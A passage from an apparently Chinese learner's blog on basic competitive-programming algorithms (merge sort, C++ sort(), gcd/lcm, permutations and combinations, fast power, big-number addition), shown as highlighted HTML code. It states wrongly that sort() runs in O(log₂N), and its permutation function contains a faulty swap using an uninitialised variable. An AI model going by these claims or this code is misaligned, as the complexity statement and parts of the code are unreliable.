operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        <span class="token function">mergeSort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span>arr2<span class="token punctuation">,</span>a<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mergeSort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span>arr2<span class="token punctuation">,</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">merge</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span>arr2<span class="token punctuation">,</span>a<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">mergeSort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="时间复杂度-3"><a href="#时间复杂度-3" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>设需要排序的数字的个数为n；</p><p>归并排序稳定性比较高，最好情况、最坏情况都为nlogn，所以时间复杂度为O(nlogn)；</p><h4 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h4><p>sort() 是C++标准库里面的库函数，之前做编程练习题目的时候经常会用到，算是quicksort的另一种形式，因为时</p><p>间复杂度都为 O(log₂N)，完美地解决了所谓的TLE问题，直接上代码：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用sort函数 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种是最简单的形式，默认从小到大，那从大到小呢？嘿嘿，别着急，来看：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//自定义函数 </span><span class="token punctuation">{</span>    <span class="token keyword">return</span> m<span class="token operator">></span>n<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cin <span class="token operator">>></span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>a<span class="token operator">+</span>n<span class="token punctuation">,</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用sort函数 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种是加一个自定义函数cmp，用于大小比较，从小到大时也可以自定义一个函数，但是没必要其实；</p><p>还有其他很多种形式，去about页面，有我的联系方式，给我发信息给你代码（嘻嘻嘻）；</p><p>可以去练习一下，请见<a href="http://acm.hdu.edu.cn/showproblem.php?pid=1040" target="_blank" rel="noopener">杭电1040</a></p><h3 id="gcd-amp-lcm"><a href="#gcd-amp-lcm" class="headerlink" title="gcd &amp; lcm"></a>gcd &amp; lcm</h3><p>gcd模板其实已经写烂了，但是几个月没碰过编程了，难免会有些生疏，再来回顾一下；</p><p>lcm也很简单，两数乘积除以最大公约数；</p><h4 id="gcd"><a href="#gcd" class="headerlink" title="gcd"></a>gcd</h4><p>先看最原始的代码（我第一次写的代码）：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">gcd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>b<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        t <span class="token operator">=</span> a<span class="token operator">%</span>b<span class="token punctuation">;</span>         a <span class="token operator">=</span> b<span class="token punctuation">;</span>         b <span class="token operator">=</span> t<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> m <span class="token operator">>></span> n<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">gcd</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三目运算法（这个超级简单）：</p><p>不会三目运算符的回C语言再学习一下哦~</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">gcd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span>b<span class="token operator">?</span>a<span class="token operator">:</span><span class="token function">gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//三目运算符</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> m <span class="token operator">>></span> n<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">gcd</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lcm"><a href="#lcm" class="headerlink" title="lcm"></a>lcm</h4><p>lcm其实没啥好说的，用三目来说，直接看代码：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">gcd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span>b<span class="token operator">?</span>a<span class="token operator">:</span><span class="token function">gcd</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">lcm</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>m<span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">gcd</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> m <span class="token operator">>></span> n<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">lcm</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是不是超级简单，那就去练习一下：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=2504" target="_blank" rel="noopener">杭电2504</a></p><h3 id="排列组合"><a href="#排列组合" class="headerlink" title="排列组合"></a>排列组合</h3><p>排列组合也遇到过，解决“有多少种”这类问题经常遇见，只不过，这类问题都很简单，一学就会；概念高中已经学</p><p>过了，这里就不多说了；</p><h4 id="排列A"><a href="#排列A" class="headerlink" title="排列A"></a>排列A</h4><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>t<span class="token punctuation">,</span>ans<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">&lt;</span>n<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        m<span class="token operator">=</span>t<span class="token punctuation">;</span>        t<span class="token operator">=</span>n<span class="token punctuation">;</span>        n<span class="token operator">=</span>m<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>m<span class="token punctuation">;</span>i<span class="token operator">>=</span>m<span class="token operator">-</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ans <span class="token operator">*</span><span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> m <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">></span>n<span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">A</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">else</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">A</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>m<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="组合C"><a href="#组合C" class="headerlink" title="组合C"></a>组合C</h4><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>n<span class="token punctuation">;</span>i<span class="token operator">>=</span>n<span class="token operator">-</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ans<span class="token operator">*</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        ans<span class="token operator">/</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> m <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">></span>n<span class="token punctuation">)</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">C</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">else</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">C</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>m<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>快速幂这个算法可以用来计算那些次方很多数据很大的问题，有些问题会出现TLE，引入快速幂，很好得解决了这</p><p>个问题，它的时间复杂度为 O(log₂N)，上代码：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">quick</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span><span class="token keyword">long</span> <span class="token keyword">long</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>base <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span> y <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> y <span class="token operator">%</span> <span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            ans <span class="token operator">*</span><span class="token operator">=</span> base<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        base <span class="token operator">*</span><span class="token operator">=</span> base<span class="token punctuation">;</span>        y <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin <span class="token operator">>></span> m <span class="token operator">>></span> n<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">quick</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个可以计算到2的62次方左右，因为long long的范围有限；</p><h3 id="大数相加（模拟）"><a href="#大数相加（模拟）" class="headerlink" title="大数相加（模拟）"></a>大数相加（模拟）</h3><p>这个挺有意思的题目，上大学之前刷题的时候就有人说，初学者做不出来“A+B”，当时我还笑了，“A+B”有什么难</p><p>的，一个输入一个输出不就完事，后来有人说，那你计算111….(100个1) + 222….(100个2)的值，我一想，不行</p><p>啊，int不够，long long不够，int64页不够，我就放弃了；再后来….咳，请看代码：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">//大数相加</span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> m<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>L1<span class="token punctuation">,</span>L2<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">1002</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">1002</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> num1<span class="token punctuation">[</span><span class="token number">1002</span><span class="token punctuation">]</span><span class="token punctuation">,</span>num2<span class="token punctuation">[</span><span class="token number">1002</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>num1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//数组清零 </span>    <span class="token function">memset</span><span class="token punctuation">(</span>num2<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>num2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//数组清零</span>    cin <span class="token operator">>></span> a <span class="token operator">>></span> b<span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//输入数组 </span>    L1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//计算数组a的长度 </span>    L2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//计算数组b的长度 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>L1<span class="token number">-1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        num1<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">;</span>           m<span class="token operator">++</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//字符-->数字 </span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span>L2<span class="token number">-1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        num2<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'0'</span><span class="token punctuation">;</span>            n<span class="token operator">++</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">//字符-->数字 </span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1002</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        k <span class="token operator">=</span> i<span class="token punctuation">;</span>        num1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> num2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// num1数组当成一个新的数组，重新赋值 </span>        <span class="token keyword">if</span><span class="token punctuation">(</span>num1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            num1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断是否超过10 超过进位 </span>            num1<span class="token punctuation">[</span><span class="token operator">++</span>k<span class="token punctuation">]</span> <span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//下一位进 1 </span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">;</span>i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>num1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//判断什么时候不为 0 </span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cout <span class="token operator">&lt;&lt;</span> num1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        